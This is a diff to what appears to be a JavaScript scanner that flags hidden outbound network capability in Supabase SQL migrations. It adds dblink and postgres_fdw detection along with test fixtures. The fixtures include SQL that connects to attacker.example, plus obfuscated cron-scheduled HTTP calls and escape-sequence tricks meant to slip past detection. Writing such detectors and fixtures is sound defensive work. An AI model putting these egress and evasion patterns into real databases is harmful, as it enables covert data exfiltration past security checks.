@@ -605,6 +605,8 @@ function hasAiRuntimeBoundary(content, path = "") {
     || sqlTokens.some((token) => ["schedule", "quoted:schedule", "schedule_in_database", "quoted:schedule_in_database", "unschedule", "quoted:unschedule", "alter_job", "quoted:alter_job"].includes(token))
     || sqlStructuralTokens(sqlLexicalContent).some((token) => token.type === "string" && token.value.toLowerCase() === "cron")
   );
+  const hasExternalDatabaseCapability = normalizedPath.endsWith(".sql")
+    && sqlTokens.some((token) => token.replace(/^quoted:/, "").startsWith("dblink") || token.replace(/^quoted:/, "") === "postgres_fdw");
   const hasAdjacentSqlStrings = normalizedPath.endsWith(".sql") && /(?:^|[\s(])(?:E|U&)?'(?:[^']|'')*'\s*(?:\r?\n|\r)[ \t]*(?:E|U&)?'/im.test(sqlLexicalContent);
   const approvedEgressHosts = new Set([
     "api.github.com",
@@ -690,7 +692,7 @@ function hasAiRuntimeBoundary(content, path = "") {
     || /\b(?:import|require)\s*\(/.test(normalizedContent)
     || /\bResponse\.redirect\s*\(/.test(normalizedContent)
     || /\bpg_net\b|\bnet\s*\.\s*http_(?:get|post|delete|head)\b|\bsupabase_functions\s*\.\s*http_request\b|\bextensions\s*\.\s*http(?:_(?:get|post|put|delete|head))?\b|\bhttp(?:_(?:get|post|put|delete|head))?\s*\(/i.test(capabilityContent)
-    || hasDynamicSqlExecute || hasSqlOutboundToken || hasSqlUnicodeEscapedIdentifier || hasSqlUnicodeEscapedString || hasSqlNumericEscape || hasLegacySqlBackslashEscapes || hasUnapprovedSqlSetConfig || hasPgSettingsReference || hasSqlSchedulingCapability || hasAdjacentSqlStrings
+    || hasDynamicSqlExecute || hasSqlOutboundToken || hasSqlUnicodeEscapedIdentifier || hasSqlUnicodeEscapedString || hasSqlNumericEscape || hasLegacySqlBackslashEscapes || hasUnapprovedSqlSetConfig || hasPgSettingsReference || hasSqlSchedulingCapability || hasExternalDatabaseCapability || hasAdjacentSqlStrings
   );
   return (
     hasUnapprovedLiteralEgress || hasUnapprovedDirectFetch || hasUnapprovedConfigOrigin || hasUnapprovedMemberFetch || hasFetchAlias || hasFetchCapabilityEscape || hasDynamicCapabilityLookup || hasUnapprovedOutboundCapability ||
@@ -788,6 +790,8 @@ for (const fixture of [
   { content: "select cron.schedule_in_database('hidden-egress', '* * * * *', 'select extensions.ht' || 'tp_get(...)', current_database());", path: "supabase/migrations/99999999999999-cron-database-command-outbound.sql" },
   { content: "set search_path to 'cron', 'public'; select schedule_in_database('hidden-egress', '* * * * *', 'select extensions.ht' || 'tp_get(...)', current_database());", path: "supabase/migrations/99999999999999-cron-search-path-command-outbound.sql" },
   { content: "set search_path to 'cron'; insert into job (schedule, command) values ('* * * * *', 'select extensions.ht' || 'tp_get(...)');", path: "supabase/migrations/99999999999999-cron-search-path-job-outbound.sql" },
+  { content: "create extension dblink; select dblink_connect('host=attacker.example dbname=hidden');", path: "supabase/migrations/99999999999999-dblink-outbound.sql" },
+  { content: "create extension postgres_fdw; create server hidden foreign data wrapper postgres_fdw options (host 'attacker.example');", path: "supabase/migrations/99999999999999-postgres-fdw-outbound.sql" },
   { content: "alter role current_user set standard_conforming_strings to off;", path: "supabase/migrations/99999999999999-alter-role-legacy-escape.sql" },
   { content: "alter database meccha_manual set standard_conforming_strings = 'off';", path: "supabase/migrations/99999999999999-alter-database-legacy-escape.sql" },
   { content: "select set_config('standard_conforming_strings', 'off', false); create function public.dynamic_outbound() returns void as 'begin EX\\ECUTE ''select extensions.ht'' || ''tp_get(...)''; end' language plpgsql;", path: "supabase/migrations/99999999999999-legacy-set-config-body-outbound.sql" },
